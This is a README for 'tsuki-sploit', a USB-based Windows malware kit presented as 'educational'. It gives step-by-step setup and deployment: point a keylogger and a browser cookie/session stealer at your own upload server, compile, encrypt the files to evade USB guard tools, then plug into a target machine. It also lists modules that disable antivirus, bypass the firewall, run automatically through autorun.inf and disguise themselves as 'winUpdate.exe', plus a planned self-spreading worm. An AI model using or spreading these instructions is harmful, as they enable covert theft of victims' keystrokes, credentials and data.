# tsuki-sploit [FOR EDUCATIONAL PURPOSES ONLY]

Please note that `tsuki-sploit` should only be used in controlled environments for educational purposes. 
Any unauthorized or malicious use of this tool is strictly prohibited. 

## About

`tsuki-sploit` is a USB-based script designed for security assessment and educational purposes. 

The script is structured with different modules, each focusing on specific aspects of security assessment. These modules include:

- Keystroke Listener: Monitors keystrokes during active browser sessions, allowing for the logging of keystrokes and secure upload of collected data to a designated file dump server.
- Browser Watch: Analyzes web browsing activities, collecting information such as cookies, sessions, and browsing history. The collected data can be securely transmitted to a dump server or stored on a USB drive.
- User Harvest: Gathers hardware and device user information, providing insights into system configurations and user profiles.
- FS Scrape (Upcoming Update): Enables the scraping of files and folders, allowing for a comprehensive examination of file systems. Users will be able to collect copies of files and folders on USB drives or securely upload them to a file server.
- Network Info: Collects sensitive network-related data, aiding in network security assessments and the identification of IPs and MAC addresses.
- Infect Await (Upcoming Update): (worm based on device-plug; injects itself with messages such as email or chat windows.

Please refer to the folder structure and definitions section below for more information on the contents of the script.

Developers of `tsuki-sploit` hold no liability for any damages or misuse resulting from the use of `tsuki-sploit`. 

It is essential to comply with legal and ethical guidelines when utilizing security assessment tools.

## Preparing files

- Clone repository
- Go to tsuki-sploit/phantom-intrusion/browser-watch/vstate.c
  - Go to line 117 and change the url to your own upload server
  - Save the file 
  - Open a terminal window in the same directory and enter: gcc vstate.c -o vstate.exe -I .\curl\include -L .\curl\lib -lcurl
  - Go to tsuki-sploit/phantom-intrusion/browser-watch/initiator.sh
  - Enable line 7 and save
  - Delete the .c files and the /curl folder as we won't be needing them
- Go to tsuki-sploit/phantom-intrusion/keystroke-listener/kslSys.py
  - Go to line 40
  - Change the url to your own upload server and save
- Go through all the folders and delete file ending with .c (Left them so you can understand what those .exe files do)
- Rename usb to D:
- Copy files into usb (feel free to delete files by github: LICENCE, README.md, etc...)
- Double click `encryptor_b64_manual.sh` to encrypt the files to avoid getting detected by usb guard tools

## Launching processes

- Plug usb into target machine (Running windows)
- Wait apx 30 secs AFTER you see a folder called "target-copy"
- Unplug

## Folder Structure and Definitions

- phantom-intrusion (All .c files have to be deleted BEFORE plugging on target)
  - keystroke-listener (records keystrokes when a browser session is active)
    - `initiator.sh` (initiates main.exe)
    - `main.exe` (installs python and required packages => launches ksiSys.py)
    - `ksiSys.py` (Logs keystrokes when browser session is active and when closed, it logs strokes into a file and uploads it to your file dump server)
  - browser-watch (monitors cookies, sessions, and history)
    - `initiator.sh` (calls on v/ustate.exe depending on current location (usb OR victim))
    - `vstate.exe` (collects all data passed from the initiator and pushes it to the database when in victim state and uploads data to your file dump server)
    - `ustate.exe` (collects all data passed from the initiator copies it in usb when in usb state)
  - user-harvest (collects hardware/device user information)
    - `initiator.sh` (initiates main.exe)
    - `main.exe` (collects data to a file on plug)
  - <span style="color: orange;">[NEXT UPDATE]</span> fs-scrape (scrapes files and folders)
    - `initiator.sh` (Initiates executable depending on state (u|v)) 
    - `ustate.exe` (gathers a copy of files on plug to usb when in usb state) 
    - `vstate.exe` (gathers a copy of files on plug to database when in victim state periodically)
  - network-info (collects sensitive network data) 
    - `initiator.sh` (Initiates main.exe) 
    - `main.exe` (gathers info about the network to a file in usb)
  - <span style="color: orange;">[NEXT UPDATE]</span> infect-await (worm based on device-plug; injects itself with messages such as email or chat windows and deletes its footprint)
    - `initiator.sh` (Initiates main.exe) 
    - `main.exe` (Listens to connected devices and injects with each message)
- shadow-breach
  - `avDisruptor.sh` (disables antivirus detection mechanisms)
  - `fwNeutralizer.sh` (bypasses firewall blocks)
  - `heartbeat.sh` (Initiates the attack)
  - `winUpdate.exe` (Calls heartbeat.sh)
- `darkEngine` (initiates script)
- `autorun.inf` (Calls on decryptor_b64_manual.sh and launch-with-admin.bat on usb plug)
- `decryptor_b64_manual.sh` (Decrypts the file when IN target system from usb)
- `ecryptor_b64_manual.sh` (Encrypts the file when IN host system from usb to avoid usb tools threat detection)
- `launch-with-admin.bat` (Calls darkEngine.sh with admin privileges)
- gitignore
- LICENSE
- README.md

## Disclaimer

`tsuki-sploit` is for educational purposes only. Any illegal or malicious use of the tool is strictly prohibited.

The authors of `tsuki-sploit` are not responsible for any damage or harm caused by the use of this tool.

Use at your own risk.
